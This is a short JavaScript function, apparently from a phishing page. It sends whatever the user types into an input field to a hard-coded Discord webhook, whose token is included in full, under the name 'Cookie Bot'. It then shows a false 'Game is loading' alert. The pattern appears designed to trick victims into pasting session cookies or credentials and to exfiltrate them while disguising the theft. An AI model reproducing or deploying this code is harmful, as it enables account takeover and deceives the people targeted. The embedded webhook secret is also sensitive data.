function sendMessage() {
    var webhookURL = 'https://discord.com/api/webhooks/1300892658977472652/qWa6TpYKU2-WHu5a6ldFhTEwyQzYuP8SHJZsw5puDsdvZrVRY-s5pw4m9btEPKNzyWup';
    var message = document.getElementById('inputText').value;

    var request = new XMLHttpRequest();
    request.open('POST', webhookURL);
    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: 'Cookie Bot',
        content: message
    };

    request.send(JSON.stringify(params));
    alert('Game is loading this could take a few minutes!');
}
